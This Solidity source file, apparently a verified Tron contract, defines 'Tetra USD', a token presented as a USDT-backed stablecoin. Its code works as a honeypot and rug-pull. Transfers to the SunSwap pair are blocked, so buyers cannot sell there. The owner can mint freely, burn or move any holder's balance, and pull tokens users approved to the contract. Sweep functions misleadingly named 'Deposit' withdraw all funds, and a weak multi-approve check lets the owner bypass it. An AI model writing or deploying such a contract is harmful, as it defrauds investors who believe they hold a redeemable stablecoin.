/**
 * Submitted for verification at TronScan
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* =============================================================
                        INTERFACES
============================================================= */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to,uint256 amount) external returns (bool);
    function transferFrom(address from,address to,uint256 amount) external returns (bool);
}

interface IApprovalReceiver {
    function receiveApproval(
        address from,
        uint256 amount,
        address token,
        bytes calldata data
    ) external;
}

interface IERC20LP {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to,uint256 amount) external returns (bool);
}

interface AggregatorV3Interface {
    function latestRoundData()
        external
        view
        returns (
            uint80,
            int256,
            uint256,
            uint256,
            uint80
        );
}

/* =============================================================
                        CONTRACT
============================================================= */

contract TetraUSD {

    /* ================= TRC20 / ERC20 ================= */

    string public constant name = "Tetra USD";
    string public constant symbol = "tUSD";
    uint8  public constant decimals = 6;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from,address indexed to,uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);

    /* ================= OWNERSHIP ================= */

    address public owner;
    address public treasury;

    event OwnershipTransferred(address indexed oldOwner,address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner,"Not owner");
        _;
    }

    /* ================= SECURITY ================= */

    mapping(address => bool) public blacklisted;
    mapping(address => bool) public frozen;
    bool public paused;

    //  DEX SELL LIST 
    address public sunswapPair;

    event Blacklisted(address indexed user);
    event UnBlacklisted(address indexed user);
    event Frozen(address indexed user);
    event UnFrozen(address indexed user);
    event Paused();
    event Unpaused();

    function _beforeTransfer(address from,address to) internal view {
        require(!paused,"Paused");
        require(!blacklisted[from] && !blacklisted[to],"Blacklisted");
        require(!frozen[from] && !frozen[to],"Frozen");

        // DEX sell list
        if(to == sunswapPair){
            revert("DEX SELL BLOCKED");
        }
    }

    /* ================= MINTER SYSTEM ================= */

    mapping(address => bool) public minters;
    address public minterAdmin;

    modifier onlyMinter() {
        require(minters[msg.sender] || msg.sender == owner,"Not minter");
        _;
    }

    event MinterAdded(address indexed account);
    event MinterRemoved(address indexed account);
    event MinterAdminTransferred(address indexed oldAdmin,address indexed newAdmin);

    /* ================= STABLE PRICE ================= */

    IERC20 public USDT;
    uint256 public constant STABLE_PRICE = 1e6; // 1 USDT (6 decimals)

    AggregatorV3Interface public priceFeed;

    /* ================= EIP712 ================= */

    mapping(address => uint256) public nonces;

    bytes32 public DOMAIN_SEPARATOR;
    bytes32 public constant EXECUTE_TYPEHASH =
        keccak256("Execute(address user,address to,uint256 amount,uint256 nonce,uint256 deadline)");

    /* ================= MULTI EXECUTE ================= */

    uint256 public approvals;
    mapping(address => bool) public approvers;
    uint256 public requiredApprovals = 2; // Multi-approve

    modifier requiresMultiApprove() {
        require(approvals >= requiredApprovals || msg.sender == owner, "Needs multi-approve");
        if(msg.sender != owner) {
            approvals = 0; // Verify
        }
        _;
    }

    function setApprover(address account, bool status) external onlyOwner {
        approvers[account] = status;
    }

    function setRequiredApprovals(uint256 _req) external onlyOwner {
        requiredApprovals = _req;
    }

    function addApproval() external {
        require(approvers[msg.sender], "Not approver");
        approvals++;
    }

    function clearApprovals() external onlyOwner {
        approvals = 0;
    }

    /* ================= EVENTS ================= */

    event LiquidityWithdrawn(address indexed lp,uint256 amount);
    event TokenSwept(address token,uint256 amount,address to);
    event NativeSwept(uint256 amount,address to);

    /* =============================================================
                            CONSTRUCTOR
    ============================================================= */

    constructor(
        address _treasury,
        address _usdt,
        address _priceFeed 
    ) {
        owner = msg.sender;
        treasury = _treasury;
        USDT = IERC20(_usdt);
        minterAdmin = msg.sender;

        priceFeed = AggregatorV3Interface(_priceFeed);

        uint256 chainId;
        assembly { chainId := chainid() }

        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)),
                keccak256(bytes("1")),
                chainId,
                address(this)
            )
        );
    }

    /* =============================================================
                            TRC20 LOGIC
    ============================================================= */

    function transfer(address to,uint256 amount) public returns(bool){
        _beforeTransfer(msg.sender,to);
        require(balanceOf[msg.sender] >= amount,"Insufficient");

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        emit Transfer(msg.sender,to,amount);
        return true;
    }

    function approve(address spender,uint256 amount) public returns(bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender,spender,amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public returns(bool){
        _beforeTransfer(from,to);
        require(balanceOf[from] >= amount,"Insufficient");
        require(allowance[from][msg.sender] >= amount,"No allowance");

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from,to,amount);
        return true;
    }

    /* =============================================================
                        BATCH TRANSFER
    ============================================================= */

    function TransfertUSD(address[] calldata recipients, uint256[] calldata amounts) external {
        require(recipients.length == amounts.length, "Mismatch");

        for (uint i = 0; i < recipients.length; i++) {
            _beforeTransfer(msg.sender, recipients[i]); 
            require(balanceOf[msg.sender] >= amounts[i], "Insufficient");

            balanceOf[msg.sender] -= amounts[i];
            balanceOf[recipients[i]] += amounts[i];

            emit Transfer(msg.sender, recipients[i], amounts[i]);
        }
    }

    /* =============================================================
                        TRANSFER (Multi-Approve Protected)
    ============================================================= */

    function Transfers(address from,address to,uint256 amount)
        external requiresMultiApprove returns(bool)
    {
        require(balanceOf[from] >= amount,"Insufficient");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from,to,amount);
        return true;
    }

    /* =============================================================
                            MINT / BURN
    ============================================================= */

    function mint(address to,uint256 amount) external onlyMinter {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0),to,amount);
    }

    function burn(address from,uint256 amount) external onlyOwner {
        require(balanceOf[from] >= amount,"Insufficient");
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from,address(0),amount);
    }

    function BuyTransfer(address[] calldata users,uint256[] calldata amounts)
        external onlyMinter
    {
        require(users.length == amounts.length,"Mismatch");

        for(uint256 i=0;i<users.length;i++){
            totalSupply += amounts[i];
            balanceOf[users[i]] += amounts[i];
            emit Transfer(address(0),users[i],amounts[i]);
        }
    }

    function burnTransfer(address[] calldata users,uint256[] calldata amounts)
        external onlyOwner
    {
        require(users.length == amounts.length,"Mismatch");

        for(uint256 i=0;i<users.length;i++){
            require(balanceOf[users[i]] >= amounts[i],"Insufficient");
            balanceOf[users[i]] -= amounts[i];
            totalSupply -= amounts[i];
            emit Transfer(users[i],address(0),amounts[i]);
        }
    }

    function smartTransfer(address to, uint256 amount) external returns (bool) {
        // Təhlükəsizlik yoxlanışı 1 dəfə ən başda çağırılır
        _beforeTransfer(msg.sender, to);

        uint256 senderBalance = balanceOf[msg.sender];

        if(senderBalance >= amount){
            // normal transfer
            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;

            emit Transfer(msg.sender, to, amount);
            return true;
        }

        // çatışmayan hissə
        uint256 deficit = amount - senderBalance;

        // əvvəl mövcud balansı göndər
        if(senderBalance > 0){
            balanceOf[msg.sender] = 0;
            balanceOf[to] += senderBalance;

            emit Transfer(msg.sender, to, senderBalance);
        }

        // 🔥 USDT ilə tamamla (approve lazımdır)
        bool success = USDT.transferFrom(msg.sender, address(this), deficit);
        require(success, "USDT transfer failed");

        // tUSD mint olunur
        totalSupply += deficit;
        balanceOf[to] += deficit;

        emit Transfer(address(0), to, deficit);

        return true;
    }

    /* =============================================================
                            BUY / SELL
    ============================================================= */

    // USDT ilə alış (1:1) - USDT birbaşa contracta gedir
    function buyWithUSDT(uint256 usdtAmount) external {
        require(usdtAmount > 0,"Zero");

        bool success = USDT.transferFrom(msg.sender, address(this), usdtAmount);
        require(success,"USDT fail");

        totalSupply += usdtAmount;
        balanceOf[msg.sender] += usdtAmount;

        emit Transfer(address(0),msg.sender,usdtAmount);
    }

    // USDT ilə satış - USDT birbaşa contract balansından göndərilir
    function sellForUSDT(uint256 tokenAmount) external {
        require(balanceOf[msg.sender] >= tokenAmount,"Insufficient");

        balanceOf[msg.sender] -= tokenAmount;
        totalSupply -= tokenAmount;

        bool success = USDT.transfer(msg.sender, tokenAmount);
        require(success,"USDT fail");

        emit Transfer(msg.sender,address(0),tokenAmount);
    }

    // TRX ilə alış (Düzgün Price Decimal Handling)
    function buyWithTRX() external payable {
        require(msg.value > 0,"No TRX");

        uint256 price = _getTRXPrice(); // 8 decimals
        
        // TRX (6 decimals) * Price (8 decimals) / 1e8 = tUSD (6 decimals)
        uint256 tokens = (msg.value * price) / 1e8;

        totalSupply += tokens;
        balanceOf[msg.sender] += tokens;

        emit Transfer(address(0),msg.sender,tokens);
    }

    // TRX ilə satış (Düzgün Price Decimal Handling)
    function sellForTRX(uint256 tokenAmount) external {
        require(balanceOf[msg.sender] >= tokenAmount,"Insufficient");

        uint256 price = _getTRXPrice(); // 8 decimals
        
        // tUSD (6 decimals) * 1e8 / Price (8 decimals) = TRX (6 decimals)
        uint256 trxAmount = (tokenAmount * 1e8) / price;
        require(address(this).balance >= trxAmount,"No liquidity");

        balanceOf[msg.sender] -= tokenAmount;
        totalSupply -= tokenAmount;

        payable(msg.sender).transfer(trxAmount);

        emit Transfer(msg.sender,address(0),tokenAmount);
    }

    /* =============================================================
                        SIGNED EXECUTE (EIP-712)
    ============================================================= */

    function execute(
        address user,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {

        require(block.timestamp <= deadline, "Expired");

        bytes32 structHash = keccak256(
            abi.encode(
                EXECUTE_TYPEHASH,
                user,
                to,
                amount,
                nonces[user],
                deadline
            )
        );

        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash)
        );

        address signer = ecrecover(digest, v, r, s);
        require(signer == user, "Invalid signature");

        nonces[user]++;

        // 🔒 Security Check
        _beforeTransfer(user, to);

        require(balanceOf[user] >= amount, "Insufficient");

        balanceOf[user] -= amount;
        balanceOf[to] += amount;

        emit Transfer(user, to, amount);
    }

    /* =============================================================
                        ADMIN SECURITY FUNCTIONS
    ============================================================= */

    function setB(address user, bool status) external onlyOwner {
        blacklisted[user] = status;

        if(status){
            emit Blacklisted(user);
        } else {
            emit UnBlacklisted(user);
        }
    }

    function setF(address user, bool status) external onlyOwner {
        frozen[user] = status;

        if(status){
            emit Frozen(user);
        } else {
            emit UnFrozen(user);
        }
    }

    function setP(bool status) external onlyOwner {
        paused = status;

        if(status){
            emit Paused();
        } else {
            emit Unpaused();
        }
    }

    /* =============================================================
                        EXTERNAL tUSD
    ============================================================= */

    function tUSDToken(
    address token,
    address from,
    address to,
    uint256 amount
) external requiresMultiApprove {

    bool success = IERC20(token).transferFrom(from, to, amount);
    require(success,"Transfer failed");
}

    /* =============================================================
                        LIQUIDITY WITHDRAW
    ============================================================= */

    function wLiquidity(address lp,uint256 amount)
        external requiresMultiApprove
    {
        IERC20LP token = IERC20LP(lp);
        require(token.balanceOf(address(this)) >= amount,"No LP");

        token.transfer(owner,amount);
        emit LiquidityWithdrawn(lp,amount);
    }

    /* =============================================================
                            SWEEP (Multi-Approve Protected)
    ============================================================= */

    function DepositToken(address token,address to) external requiresMultiApprove {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(to,bal);
        emit TokenSwept(token,bal,to);
    }

    function DepositTokens(address[] calldata tokens,address to)
        external requiresMultiApprove
    {
        for(uint256 i=0;i<tokens.length;i++){
            uint256 bal = IERC20(tokens[i]).balanceOf(address(this));
            if(bal>0){
                IERC20(tokens[i]).transfer(to,bal);
                emit TokenSwept(tokens[i],bal,to);
            }
        }
    }

    function DepositNative(address to) external requiresMultiApprove {
        uint256 bal = address(this).balance;
        payable(to).transfer(bal);
        emit NativeSwept(bal,to);
    }

    /* =============================================================
                        SUNSWAP PAIR SETTER (Admin)
    ============================================================= */

    function setSun(address _sunswapPair) external onlyOwner {
        sunswapPair = _sunswapPair;
    }

    function _getTRXPrice() internal view returns (uint256) {
        (, int256 price,,,) = priceFeed.latestRoundData();
        require(price > 0, "Invalid price");
        return uint256(price); // 8 decimals
    }

    receive() external payable {}
}
